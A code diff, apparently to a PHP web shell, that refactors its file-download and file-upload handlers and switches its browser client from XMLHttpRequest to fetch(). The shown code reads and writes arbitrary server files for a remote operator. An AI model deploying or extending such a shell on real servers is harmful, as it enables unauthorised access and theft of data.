@@ -137,7 +137,7 @@ function featureHint($fileName, $cwd, $type)
 function featureDownload($filePath)
 {
     $file = @file_get_contents($filePath);
-    if ($file === FALSE) {
+    if ($file === false) {
         return array(
             'stdout' => base64_encode('File not found / no read permission.'),
             'cwd' => base64_encode(getcwd())
@@ -154,7 +154,7 @@ function featureUpload($path, $file, $cwd)
 {
     chdir($cwd);
     $f = @fopen($path, 'wb');
-    if ($f === FALSE) {
+    if ($f === false) {
         return array(
             'stdout' => base64_encode('Invalid path / no write permission.'),
             'cwd' => base64_encode(getcwd())
@@ -573,20 +573,25 @@ if (isset($_GET["feature"])) {
                 }
                 return a.join("&");
             }
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", full_url, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    try {
-                        var responseJson = JSON.parse(xhr.responseText);
-                        callback(responseJson);
-                    } catch (error) {
-                        alert("Error while parsing response: " + error);
+            fetch(full_url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: getQueryString()
+                })
+                .then(response => {
+                    if (response.ok) {
+                        return response.json();
                     }
-                }
-            };
-            xhr.send(getQueryString());
+                    throw new Error('Network response was not ok');
+                })
+                .then(responseJson => {
+                    callback(responseJson);
+                })
+                .catch(error => {
+                    alert("Error while fetching: " + error);
+                });
         }
 
         document.onclick = function(event) {
